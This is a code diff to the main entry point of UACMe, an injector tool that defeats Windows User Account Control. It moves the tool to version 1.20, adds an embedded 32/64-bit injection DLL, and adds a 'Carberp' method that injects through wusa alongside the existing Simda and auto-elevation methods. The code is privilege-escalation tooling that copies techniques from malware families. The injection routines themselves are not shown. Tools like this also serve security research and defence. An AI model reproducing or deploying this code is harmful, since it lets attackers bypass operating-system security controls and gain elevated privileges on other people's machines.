@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.10
+*  VERSION:     1.20
 *
-*  DATE:        27 Mar 2015
+*  DATE:        29 Mar 2015
 *
 *  Injector entry point.
 *
@@ -18,6 +18,14 @@
 *******************************************************************************/
 
 #include "global.h"
+
+#ifdef _WIN64
+#include "dll64.h"
+#define INJECTDLL dll64
+#else
+#include "dll32.h"
+#define INJECTDLL dll32
+#endif
 
 #define PROGRAMTITLE TEXT("UACMe")
 #define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
@@ -92,6 +100,10 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] Method Simda selected\n\r"));
 			dwType = METHOD_SIMDA;
 		}
+		if (lstrcmpi(szBuffer, TEXT("6")) == 0) {
+			OutputDebugString(TEXT("[UCM] Method Carberp selected\n\r"));
+			dwType = METHOD_CARBERP;
+		}
 	}
 
 	if ((dwType == METHOD_SYSPREP_EX) && (osver.dwBuildNumber < 9600)) {
@@ -116,7 +128,7 @@ VOID main()
 			goto Done;
 		}
 #endif
-		if (ucmStandardAutoElevation(dwType)) {
+		if (ucmStandardAutoElevation(dwType, INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
 		}
 		break;
@@ -150,6 +162,26 @@ VOID main()
 			if (ucmSimdaTurnOffUac()) {
 				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
 			}
+		}
+		break;
+
+	case METHOD_CARBERP:
+
+		if (osver.dwBuildNumber > 9600) {
+			MessageBoxW(GetDesktopWindow(),
+				TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;		
+		}
+
+		//there is no migmiz in syswow64 in 8+
+		if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
+			MessageBoxW(GetDesktopWindow(),
+				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+		}
+
+		if (ucmWusaMethod(INJECTDLL, sizeof(INJECTDLL))) {
+			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
 		}
 		break;
 	}
